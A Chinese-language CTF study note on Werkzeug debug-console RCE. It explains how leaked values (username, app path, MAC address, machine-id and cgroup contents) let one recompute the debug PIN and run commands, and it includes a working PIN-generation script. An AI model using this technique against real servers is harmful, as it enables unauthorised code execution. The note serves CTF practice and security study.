tags:: CTF/RCE, werkzeug

- https://ctf.anzu.link/pages/204626/
- # 原理
	- 读取到某些敏感信息后，利用敏感信息算出和受害者同样的PIN, 然后使用PIN控制flask执行命令
	- 貌似对werkzeug通用
- # PIN生成方法
	- PIN生成代码在`/home/user/.local/lib/python3.10/site-packages/werkzeug/debug/__init__.py`这个文件内
	- 需要获取到`probably_public_bits`和`private_bits`两个数组内的内容
	- `probably_public_bits`
		- `[0]`: 用户名
		- `[1]`: modname, 不魔改的话就是`flask.app`
		- `[2]`: `getattr(app, '__name__', getattr(app.__class__, '__name__'))`的运行结果，一般是`Flask`
		- `[3]`: app类的存储目录
			- 类似于`/home/user/.local/lib/python3.10/site-packages/flask/app.py`
	- `private_bits`
		- `[0]`: 十进制表示的服务器MAC
			- 可以用`int("00:16:3e:5e:6c:00".replace(":", ""), 16)`转换
		- `[1]`: 基于两个文件内容生成，各个OS的生成方法不同，以下是Linux的生成方法：
			- 获取"/etc/machine-id"或"/proc/sys/kernel/random/boot_id"的内容
			- 获取/proc/self/cgroup的内容，然后按照`/`分段，获取最后一段
			- 拼接上面获得的两段bytes
- # PIN生成脚本
	- 新版flask的生成方法和老版不一样
	- ```python
	  import hashlib
	  from itertools import chain
	  
	  rv, num = None, None
	  
	  probably_public_bits = [
	      'user'# 用户名
	      'flask.app',# modname
	      'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	      '/home/user/.local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
	  ]
	  
	  private_bits = [
	      '95535655936',# str(uuid.getnode()),  /sys/class/net/ens33/address
	      '2c2781498c424bcf86b4d5aa3c0d27faapp-glib-codium-1239.scope'# /etc/machine-id的内容+/proc/self/cgroup的结尾
	  ]
	  
	  h = hashlib.sha1()
	  for bit in chain(probably_public_bits, private_bits):
	      if not bit:
	          continue
	      if isinstance(bit, str):
	          bit = bit.encode("utf-8")
	      h.update(bit)
	  h.update(b"cookiesalt")
	  
	  cookie_name = f"__wzd{h.hexdigest()[:20]}"
	  
	  if num is None:
	      h.update(b"pinsalt")
	      num = f"{int(h.hexdigest(), 16):09d}"[:9]
	  
	  if rv is None:
	      for group_size in 5, 4, 3:
	          if len(num) % group_size == 0:
	              rv = "-".join(
	                  num[x : x + group_size].rjust(group_size, "0")
	                  for x in range(0, len(num), group_size)
	              )
	              break
	      else:
	          rv = num
	  
	  print(rv)
	  
	  ```